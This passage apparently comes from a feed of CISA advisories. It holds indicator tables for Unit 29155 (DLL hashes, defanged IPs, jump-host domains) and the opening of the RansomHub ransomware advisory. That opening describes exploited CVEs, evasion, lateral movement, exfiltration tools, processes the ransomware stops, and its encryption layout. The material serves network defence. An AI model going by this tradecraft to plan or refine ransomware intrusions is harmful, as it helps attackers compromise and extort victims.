<td>Nykfvwmchighqwcguabvgq.dll</td>
<td>8a2ba7f9cb6f65edf65dbe579907551e</td>
<td>673586594242d99ab02118595e457297</td>
</tr>
<tr>
<td>Ofgdwttnmqibnmpqx.dll</td>
<td>9657c2ef6ed5229740b125df9ca6c915</td>
<td>0dc5ac12f7690db15c99eaabc11b129c</td>
</tr>
<tr>
<td>Ohtvepefcjnchrrasokn.dll</td>
<td>a5494ffd9efb7c3df59c527076a05e62</td>
<td>e2cc52273d56ed66c800a726760c1ed0</td>
</tr>
<tr>
<td>Olkscszculdbzvco.dll</td>
<td>85afdef18d65b0518d709a5a324ea57a</td>
<td>77675a24040f10c85112d9a219d5f1c7</td>
</tr>
<tr>
<td>Onkwzkpfuqazvali.dll</td>
<td>da4d81f9ef3b25ea09f34481d923dd9d</td>
<td>cc4a9db6f250114e26d8d9ba6ab46bc9</td>
</tr>
<tr>
<td>Opaqwrazeyyilbbjlkf.dll</td>
<td>0e6374042b33d78329149a6189a7cb46</td>
<td>1934e2ebc64d41e37ef53ea0c075e974</td>
</tr>
<tr>
<td>Owxtabfdqhkaahhwsgkatuu.dll</td>
<td>d33f608f561096be24cba91797e0da2f</td>
<td>332b7f6662e28e3577bd1b269904b940</td>
</tr>
<tr>
<td>Poezcjhvkzgmnyqljpbte.dll</td>
<td>32db8abce1618e60441f5c7cf4be0d22</td>
<td>2b2509c6ee46d6327f2f1c9a75122d15</td>
</tr>
<tr>
<td>Rvyqctymumtudroyae.dll</td>
<td>dd2431b1f858b4ca14a4ea05fb8c4a06</td>
<td>9b2924c727aa3a061906321a66c9050c</td>
</tr>
<tr>
<td>Sutragevr.dll</td>
<td>7d3b529db1bd896d9fd877b85cafdc64</td>
<td>de276cf07ccffa18d7ffc35281bca910</td>
</tr>
<tr>
<td>Sxkdxclqmxnmjgedhgagl.dll</td>
<td>6e1394938c2fecad2d4f5b3bcf357ec0</td>
<td>d6b41747cb035c4c2b08790cd57f0626</td>
</tr>
<tr>
<td>Tosyxesxgrzyb.dll</td>
<td>99305ce01cc2d0f58cd226efb2de893f</td>
<td>6859fe5a3eead00a563cd93efcc6ea96</td>
</tr>
<tr>
<td>Tpmnkauftdydomyz.dll</td>
<td>6c152774f6894407075e6f0a2859bbae</td>
<td>981160dee6cd25fb181e54eca7ff7c22</td>
</tr>
<tr>
<td>Tptjtwfhpsjfksqoajt.dll</td>
<td>343b140977b3f9b227e7e5f82b0fadb5</td>
<td>95cf2a5a24b0d33d621bb8995d5826bc</td>
</tr>
<tr>
<td>Tsgblplhdwwj.dll</td>
<td>54a9fa9eb337a3b5ca7b0fa4553e439d</td>
<td>cee5acbfef7e76f52f40b8ae95199c50</td>
</tr>
<tr>
<td>Uqhznlcagzyoqrbyylnnwn.dll</td>
<td>4c19aeecbfca13b8a199703d8b8284b9</td>
<td>ad0ca738aa6c987e4ee1a87ff2b8acd5</td>
</tr>
<tr>
<td>Uslrfkxccdyetfdxmaokbhv.dll</td>
<td>dc795cb9290b1bc0b7fb1ce9d6ae7c93</td>
<td>552d9b79cc544fc6c3e8aa204dd00811</td>
</tr>
<tr>
<td>Waordspinycera.dll</td>
<td>9935a86108e3ae3f72cd15817601dcc6</td>
<td>5d063eecd894d3d523875bc82ef6f319</td>
</tr>
<tr>
<td>Wcfsobntsczz.dll</td>
<td>77aa3f342a0d69fda67c853bcc004d48</td>
<td>d0b00a6c83ce810ec2763af17e8ab1c4</td>
</tr>
<tr>
<td>Wpqyhvfnunlabx.dll</td>
<td>03af632aa6f87bf9dd4364ee3b612cbb</td>
<td>9f11e915be5c0d02a3130329cf032a28</td>
</tr>
<tr>
<td>Wqwpawlulyrsrjcbvuvddeud.dll</td>
<td>41871fef433d7b4b89fd226fe3a1a2c0</td>
<td>e21fe98cc8866c0eeecf3549ebcec751</td>
</tr>
<tr>
<td>Wqxpgvsgvhygmfbziucxcuh.dll</td>
<td>246d9f9831b125ea7e6ef21bc4c8a0ca</td>
<td>dea3ae8225913dd98148fc86cfc3bcbe</td>
</tr>
<tr>
<td>Xgcpgrxhchgwz.dll</td>
<td>9c695be3703194fdb71c212a0832bcf3</td>
<td>8744cec7547b1e73705c10a264e28e08</td>
</tr>
<tr>
<td>Xgkepoc.dll</td>
<td>69e58c5ee69f5e5e8a58f4afdd59adfe</td>
<td>d43446b4a22a597b93b559821ee5ac9b</td>
</tr>
<tr>
<td>Xlfthpiq.dll</td>
<td>540ee8e39150c539fea582b0e77be7b0</td>
<td>3fe96ff4a5ef0f5346ce645a2a893597</td>
</tr>
<tr>
<td>Xlocky.dll</td>
<td>0a2affa6d895baab087b84e93145da35</td>
<td>246f31c86bbbe7f65c0126cf4a1a947a</td>
</tr>
<tr>
<td>Xqblktvxmnxrzwiuqdfxzrd.dll</td>
<td>569c1d31f4c7ec7701d8e4e51b59fe85</td>
<td>5eaa7e812733a5c8cda734fab2f752d5</td>
</tr>
<tr>
<td>Xykqrksoqqgyuckfc.dll</td>
<td>09a2d85e809d36bff82bd5ab773980a3</td>
<td>96964aed18f65a7acae632f358a093f6</td>
</tr>
<tr>
<td>Yawyjonk.dll</td>
<td>3ccf799ff208981349cee4fb1a1cf88c</td>
<td>4e9c55c6fe25d61ca4394de794546fab</td>
</tr>
<tr>
<td>Yrknbt.dll</td>
<td>6154760e602bd71192d93f72fbdb486e</td>
<td>94bf96b76c2a092de8962496ce35deaf</td>
</tr>
<tr>
<td>Yvbmuigfihprdxgiirp.dll</td>
<td>b0d0a23766fa64ece9315f37b28bb4c0</td>
<td>1e22d64f263e8ea4b2d37dcd9b7c3012</td>
</tr>
<tr>
<td>Ywrovtjimixpmizuln.dll</td>
<td>ca43a241042b5fcc305393765ae18e69</td>
<td>28d571ddb5c04d065dfe1be9604663ba</td>
</tr>
<tr>
<td>Zfgdccnwnee.dll</td>
<td>251f3a4757d9e4de0499cc30c0bc00a9</td>
<td>755dac7edd17fbf5b5c449dd06c02e14</td>
</tr>
<tr>
<td>Zkuxhxwbvifejn.dll</td>
<td>9d7ab8b0aa669125d9a5adc4f46c56f3</td>
<td>af277ae0fbf6cc20f887696ea4756d46</td>
</tr>
<tr>
<td>Zsdflpivel.dll</td>
<td>a9c9c0be8eca3b575c24da0fcf1af1a9</td>
<td>1cac5c0cb8801e8730447023270d8d56</td>
</tr>
</tbody>
</table>
</div>
<h2><strong>Appendix B: Indicators of Compromise</strong></h2>
<p><strong>Table 27</strong> lists observed IP addresses that were first observed as early as 2022 and have been historically linked to Unit 29155 infrastructure. These IPs are considered historical infrastructure and should be investigated for associated abnormal or malicious activity.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 27: IP Addresses Associated with Unit 29155 Infrastructure</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">IP Address</th>
</tr>
</thead>
<tbody>
<tr>
<td>5.226.139[.]66</td>
</tr>
<tr>
<td>45.141.87[.]11</td>
</tr>
<tr>
<td>46.101.242[.]222</td>
</tr>
<tr>
<td>62.173.140[.]223</td>
</tr>
<tr>
<td>79.124.8[.]66</td>
</tr>
<tr>
<td>90.131.156[.]107</td>
</tr>
<tr>
<td>112.51.253[.]153</td>
</tr>
<tr>
<td>112.132.218[.]45</td>
</tr>
<tr>
<td>154.21.20[.]82</td>
</tr>
<tr>
<td>179.43.133[.]202</td>
</tr>
<tr>
<td>179.43.142[.]42</td>
</tr>
<tr>
<td>179.43.162[.]55</td>
</tr>
<tr>
<td>179.43.175[.]38</td>
</tr>
<tr>
<td>179.43.175[.]108 (data exfiltration site)</td>
</tr>
<tr>
<td><a>179.43.176[.]60</a></td>
</tr>
<tr>
<td>179.43.187[.]47</td>
</tr>
<tr>
<td>179.43.189[.]218</td>
</tr>
<tr>
<td>185.245.84[.]227</td>
</tr>
<tr>
<td>185.245.85[.]251</td>
</tr>
<tr>
<td>194.26.29[.]84</td>
</tr>
<tr>
<td>194.26.29[.]95</td>
</tr>
<tr>
<td>194.26.29[.]98</td>
</tr>
<tr>
<td>194.26.29[.]251</td>
</tr>
</tbody>
</table>
<p>Threat actors can exploit jump hosts, also known as jump servers or bastion hosts, to gain unauthorized access or perform malicious activities within a protected network. In this context, the domains listed in <strong>Table 28</strong> represent the tools used to establish functionality for creating a jump host.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 28: Domains Hosting Jump Host Tooling</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Domain Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>interlinks[.]top</td>
</tr>
<tr>
<td>https://3proxy[.]ru</td>
</tr>
<tr>
<td>https://ngrok[.]com (<strong>Note:</strong> This domain is a legitimate service leveraged for malicious purposes by Unit 29155 cyber actors and should be investigated prior to blocking.)</td>
</tr>
<tr>
<td>https://nssm[.]cc</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
") (pubDate nil "Wed, 04 Sep 2024 15:01:58 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/22132")) (item nil (title nil "#StopRansomware: RansomHub Ransomware") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-242a") (description nil "<h2><strong>Summary</strong></h2>
<p><em><strong>Note:</strong> This joint Cybersecurity Advisory is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit&nbsp;</em><a href=\"https://www.cisa.gov/stopransomware\" title=\"#StopRansomware\"><em>stopransomware.gov</em></a><em> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p>The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the Multi-State Information Sharing and Analysis Center (MS-ISAC), and the Department of Health and Human Services (HHS) (hereafter referred to as the authoring organizations)&nbsp;are releasing this joint advisory to disseminate known RansomHub ransomware IOCs and TTPs. These have been identified through FBI threat response activities and third-party reporting as recently as August 2024. RansomHub is a ransomware-as-a-service variant—formerly known as Cyclops and Knight—that has established itself as an efficient and successful service model (recently attracting high-profile affiliates from other prominent variants such as LockBit and ALPHV).</p>
<p>Since its inception in February 2024, RansomHub has encrypted and exfiltrated data from at least 210 victims representing the water and wastewater, information technology, government services and facilities, healthcare and public health, emergency services, food and agriculture, financial services, commercial facilities, critical manufacturing, transportation, and communications critical infrastructure sectors.</p>
<p>The affiliates leverage a double-extortion model by encrypting systems and exfiltrating&nbsp;data to extort victims. It should be noted that data exfiltration methods are dependent on the affiliate conducting the network compromise. The ransom note dropped during encryption does not generally include an initial ransom demand or payment instructions. Instead, the note provides victims with a client ID and instructs them to contact the ransomware group via a unique <code>.onion</code> URL (reachable through the Tor browser). The ransom note typically gives victims between three and 90 days to pay the ransom (depending on the affiliate) before the ransomware group publishes their data on the RansomHub Tor data leak site.</p>
<p>The authoring organizations encourage network defenders to implement the recommendations in the&nbsp;<strong>Mitigations</strong> section of this cybersecurity advisory to reduce the likelihood and impact of ransomware incidents.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/aa24-242a-stopransomware-ransomhub-ransomware_1.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-242A #StopRansomware: RansomHub Ransomware</a>
    <span class=\"c-file__size\">(PDF,       825.67 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/AA24-242A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-242A STIX XML</a>
    <span class=\"c-file__size\">(XML,       133.74 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/AA24-242A-StopRansomware-RansomHub-Ransomware.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-242A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       109.41 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK<sup>®</sup> Matrix for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>
<h3>Initial Access</h3>
<p>RansomHub affiliates typically compromise internet facing systems and user endpoints by using methods such as phishing emails [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1566/\" title=\"Phishing\">T1566</a>], exploitation of known vulnerabilities [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>], and password spraying [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a>]. Password spraying targets accounts compromised through data breaches. Proof-of-concept exploits are obtained from sources such as ExploitDB and GitHub [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/005/\" title=\"Obtain Capabilities: Exploits\">T1588.005</a>]. Exploits based on the following CVEs have been observed:</p>
<ul>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-3519\" title=\"CVE-2023-3519\">CVE-2023-3519</a> (<a href=\"https://www.cvedetails.com/cwe-details/94/Improper-Control-of-Generation-of-Code-Code-Injection-.html\" title=\"CWE-94 : Improper Control of Generation of Code ('Code Injection')\">CWE-94</a>)
<ul>
<li>Citrix ADC (NetScaler) Remote Code Execution. A vulnerability exists within Citrix ADC that allows an unauthenticated attacker to trigger a stack buffer overflow of the NSPPE (NetScaler Packet Processing Engine) process by making a specially crafted HTTP GET request. Successful exploitation results in remote code execution as root.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-27997\" title=\"CVE-2023-27997\">CVE-2023-27997</a> (<a href=\"https://www.cvedetails.com/cwe-details/787/Out-of-bounds-Write.html\" title=\"CWE-787 : Out-of-bounds Write\">CWE-787</a> | <a href=\"https://www.cvedetails.com/cwe-details/122/Heap-based-Buffer-Overflow.html\" title=\"CWE-122 : Heap-based Buffer Overflow\">CWE-122</a>)
<ul>
<li>A heap-based buffer overflow vulnerability in FortiOS version 7.2.4 and below, version 7.0.11 and below, version 6.4.12 and below, version 6.0.16 and below and FortiProxy version 7.2.3 and below, version 7.0.9 and below, version 2.0.12 and below, version 1.2 all versions, version 1.1 all versions SSL-VPN may allow a remote attacker to execute arbitrary code or commands via specifically crafted requests.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-46604\" title=\"CVE-2023-46604\">CVE-2023-46604</a> (<a href=\"https://www.cvedetails.com/cwe-details/502/Deserialization-of-Untrusted-Data.html\" title=\"CWE-502 : Deserialization of Untrusted Data\">CWE-502</a>)
<ul>
<li>The Java OpenWire protocol marshaller, such as in Apache ActiveMQ, is vulnerable to Remote Code Execution. This vulnerability may allow a remote attacker with network access to open either a Java-based OpenWire broker or client to run arbitrary shell commands by manipulating serialized class types in the OpenWire protocol to cause either the client or the broker (respectively) to instantiate any class on the classpath. Upgrading both brokers and clients to version 5.15.16, 5.16.7, 5.17.6, or 5.18.3 fixes this issue.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-22515\" title=\"CVE-2023-22515\">CVE-2023-22515</a>
<ul>
<li>A vulnerability in publicly accessible Confluence Data Center and Server instances that allows the creation of unauthorized Confluence administrator accounts and access to Confluence instances. Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-46747\" title=\"CVE-2023-46747\">CVE-2023-46747</a> (<a href=\"https://www.cvedetails.com/cwe-details/306/Missing-Authentication-for-Critical-Function.html\" title=\"CWE-306 : Missing Authentication for Critical Function\">CWE-306</a> | <a href=\"https://www.cvedetails.com/cwe-details/288/Authentication-Bypass-Using-an-Alternate-Path-or-Channel.html\" title=\"CWE-288 : Authentication Bypass Using an Alternate Path or Channel\">CWE-288</a>)
<ul>
<li>Undisclosed requests may bypass configuration utility authentication, allowing an attacker with network access to the BIG-IP system through the management port and/or self IP addresses to execute arbitrary system commands. <strong>Note:</strong> Software versions which have reached End of Technical Support (EoTS) are not evaluated.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-48788\" title=\"CVE-2023-48788\">CVE-2023-48788</a> (<a href=\"https://www.cvedetails.com/cwe-details/89/Improper-Neutralization-of-Special-Elements-used-in-an-SQL-C.html\" title=\"CWE-89 : Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\">CWE-89</a>)
<ul>
<li>An improper neutralization of special elements used in an SQL command (SQL injection') in Fortinet FortiClientEMS version 7.2.0 through 7.2.2 and FortiClientEMS 7.0.1 through 7.0.10 allows attacker to execute unauthorized code or commands via specially crafted packets.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2017-0144\" title=\"CVE-2017-0144\">CVE-2017-0144</a>
<ul>
<li>The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, also known as “Windows SMB Remote Code Execution Vulnerability” [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1210/\">T1210</a>].</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2020-1472\" title=\"CVE-2020-1472\">CVE-2020-1472</a>
<ul>
<li>An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller using the Netlogon Remote Protocol (MS-NRPC).</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2020-0787\" title=\"CVE-2020-0787\">CVE-2020-0787</a>
<ul>
<li>This vulnerability was also potentially exploited along with the Zerologon privilege escalation vulnerability.</li>
</ul>
</li>
</ul>
<h3>Discovery</h3>
<p>RansomHub affiliates conduct network scanning with tools such as AngryIPScanner, Nmap, and PowerShell-based living off the land methods with PowerShell to conduct network scanning [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>].</p>
<h3>Defense Evasion</h3>
<p>Cybersecurity researchers have observed affiliates renaming the ransomware executable with innocuous file names, such as <code>Windows.exe</code>, left on the user’s desktop (<code>C:\\Users\\%USERNAME%\\Desktop</code>) or downloads (<code>C:\\Users\\%USERNAME%\\Downloads</code>) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a>]. The affiliates have also cleared Windows and Linux system logs to inhibit any potential incident response [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1070/\" title=\"Indicator Removal\">T1070</a>]. Affiliates used Windows Management Instrumentation [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1047/\" title=\"Windows Management Instrumentation\">T1047</a>] to disable antivirus products. In some instances, RansomHub-specific tools were deployed to disable endpoint detection and response (EDR) tooling [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>].</p>
<h3>Privilege Escalation and Lateral Movement</h3>
<p>Following initial access, RansomHub affiliates created user accounts for persistence [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1136/\" title=\"Create Account\">T1136</a>], reenabled disabled accounts [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/\" title=\"Account Manipulation\">T1098</a>], and used Mimikatz [<a href=\"https://attack.mitre.org/versions/v15/software/S0002/\" title=\"Mimikatz\">S0002</a>] on Windows systems to gather credentials [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>] and escalate privileges to SYSTEM [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a>]. Affiliates then moved laterally inside the network through methods including Remote Desktop Protocol (RDP) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a>], PsExec [<a href=\"https://attack.mitre.org/versions/v15/software/S0029/\" title=\"PsExec\">S0029</a>], Anydesk [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\" title=\"Remote Access Software\">T1219</a>], Connectwise, N-Able, Cobalt Strike [<a href=\"https://attack.mitre.org/versions/v15/software/S0154/\" title=\"Cobalt Strike\">S0154</a>], Metasploit, or other widely used command-and-control (C2) methods.</p>
<h3>Data Exfiltration</h3>
<p>Data exfiltration methods depend heavily on the affiliate conducting the network compromise. The ransomware binary does not normally include any mechanism for data exfiltration. Data exfiltration has been observed through the usage of tools such as PuTTY [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1048/002/\" title=\"Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol\">T1048.002</a>], Amazon AWS S3 buckets/tools [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1537/\" title=\"Transfer Data to Cloud Account\">T1537</a>], HTTP POST requests [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1048/003/\" title=\"Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol\">T1048.003</a>], WinSCP, Rclone, Cobalt Strike, Metasploit, and other methods.</p>
<h3>Encryption</h3>
<p>RansomHub ransomware has typically leveraged an Elliptic Curve Encryption algorithm called Curve 25519 to encrypt user accessible files on the system [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>]. Curve 25519 uses a public/private key that is unique to each victim organization. To successfully encrypt files that are currently in use, the ransomware binary will typically attempt to stop the following processes:</p>
<ul>
<li><em>\"vmms.exe\"</em></li>
<li><em>\"msaccess.exe\"</em></li>
<li><em>\"mspub.exe\"</em></li>
<li><em>\"svchost.exe\"</em></li>
<li><em>\"vmcompute.exe\"</em></li>
<li><em>\"notepad.exe\"</em></li>
<li><em>\"ocautoupds.exe\"</em></li>
<li><em>\"ocomm.exe\"</em></li>
<li><em>\"ocssd.exe\"</em></li>
<li><em>\"oracle.exe\"</em></li>
<li><em>\"onenote.exe\"</em></li>
<li><em>\"outlook.exe\"</em></li>
<li><em>\"powerpnt.exe\"</em></li>
<li><em>\"explorer.exe\"</em></li>
<li><em>\"sql.exe\"</em></li>
<li><em>\"steam.exe\"</em></li>
<li><em>\"synctime.exe\"</em></li>
<li><em>\"vmwp.exe\"</em></li>
<li><em>\"thebat.exe\"</em></li>
<li><em>\"thunderbird.exe\"</em></li>
<li><em>\"visio.exe\"</em></li>
<li><em>\"winword.exe\"</em></li>
<li><em>\"wordpad.exe\"</em></li>
<li><em>\"xfssvccon.exe\"</em></li>
<li><em>\"TeamViewer.exe\"</em></li>
<li><em>\"agntsvc.exe\"</em></li>
<li><em>\"dbsnmp.exe\"</em></li>
<li><em>\"dbeng50.exe\"</em></li>
<li><em>\"encsvc.exe\"</em></li>
</ul>
<p>The ransomware binary will attempt to encrypt any files that the user has access to, including user files and networked shares.</p>
<p>RansomHub implements intermittent encryption, encrypting files in 0x100000 byte chunks and skipping every 0x200000 bytes of data in between encrypted chunks. Files smaller than 0x100000 bytes in size are completely encrypted. Files are appended with 58 (0x3A) bytes of data at the end. This data contains a value which is likely part of an encryption/decryption key. The structure of the appended 0x3A bytes is listed below with images from three different encrypted files.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%201%20-%20The%20first%20eight%20bytes.png?itok=7KCmOV_-\" width=\"496\" height=\"116\" alt=\"Figure 1 - The first eight bytes\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 1: The first eight bytes are the size of the encrypted file.</em></figcaption>
  </figure>
<p>The next eight bytes are the size of encrypted blocks. If the entire file is encrypted, this section is all zeros. In this example, each encrypted section is 0x100000 bytes long, with 0x100000 bytes between each encrypted block. This number was observed changing based on the size of the encrypted file.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%202%20-%20The%20size%20of%20encrypted%20blocks.png?itok=59AF45Sy\" width=\"496\" height=\"85\" alt=\"Figure 2 - The size of encrypted blocks\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 2: The size of encrypted blocks.</em></figcaption>
  </figure>
<p>The next two bytes were always seen to be 0x0001.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%203%20-%20The%20next%20two%20bytes.png?itok=M7DpLyKf\" width=\"494\" height=\"100\" alt=\"Figure 3 - The next two bytes\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 3: The next two bytes are always 0x0001.</em></figcaption>
  </figure>
<p>The next 32 bytes are the public encryption key for the file.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%204%20-%20Public%20encryption%20key.png?itok=V09lNet1\" width=\"493\" height=\"94\" alt=\"Figure 4 - Public encryption key\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 4: Public encryption key for the file.</em></figcaption>
  </figure>
<p>The next four bytes are a checksum value.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%205%20-%20Checksum%20value.png?itok=27hZrM7n\" width=\"498\" height=\"83\" alt=\"Figure 5 - Checksum value\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 5: Checksum value.</em></figcaption>
  </figure>
<p>The last four bytes are always seen to be the sequence 0x00ABCDEF.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%206%20-%20The%20last%20four%20bytes.png?itok=cT5kmoKF\" width=\"495\" height=\"82\" alt=\"Figure 6 - The last four bytes\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 6: The last four bytes.</em></figcaption>
  </figure>
<p>The ransomware executable does not typically encrypt executable files.&nbsp;A random file extension is added to file names and a ransom note generally titled <code>How To Restore Your Files.txt</code> is left on the compromised system. To further inhibit system recovery, the ransomware executable typically leverages the <code>vssadmin.exe</code> program to delete volume shadow copies [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a>].</p>
<h3>Leveraged Tools</h3>
<p>See <strong>Table 1</strong> for publicly available tools and applications used by RansomHub affiliates. This includes legitimate tools repurposed for their operations.</p>
<p><strong>Disclaimer:</strong> Use of these tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Tools Used by RansomHub Affiliates</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Tool Name</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>BITSAdmin</td>
<td>A command-line utility that manages downloads/uploads between a client and server by using the Background Intelligent Transfer Service (BITS) to perform asynchronous file transfers.</td>
</tr>
<tr>
<td>Cobalt Strike [<a href=\"https://attack.mitre.org/versions/v15/software/S0154/\" title=\"Cobalt Strike\">S0154</a>]</td>
<td>A penetration testing tool used by security professionals to test the security of networks and systems. RansomHub affiliates have used it to assist with lateral movement and file execution.</td>
</tr>
<tr>
<td>Mimikatz [<a href=\"https://attack.mitre.org/versions/v15/software/S0002/\" title=\"Mimikatz\">S0002</a>]</td>
<td>A tool that allows users to view and save authentication credentials such as Kerberos tickets. RansomHub affiliates have used it to aid privilege escalation.</td>
</tr>
<tr>
<td>PSExec [<a href=\"https://attack.mitre.org/versions/v15/software/S0029/\" title=\"PSExec\">S0029</a>]</td>
<td>A tool designed to run programs and execute commands on remote systems.</td>
</tr>
<tr>
<td>PowerShell</td>
<td>Cross-platform task automation solution made up of a command line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.</td>
</tr>
<tr>
<td>RClone</td>
<td>A command line program used to sync files with cloud storage services.</td>
</tr>
<tr>
<td>Sliver</td>
<td>A penetration testing toolset which allows for remote command and control of systems.</td>
</tr>
<tr>
<td>SMBExec</td>
<td>A tool designed to manipulate SMB services for remote code execution.</td>
</tr>
<tr>
<td>WinSCP</td>
<td>Windows Secure Copy is a free and open source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Affiliates have used it to transfer data from a compromised network to actor-controlled accounts.</td>
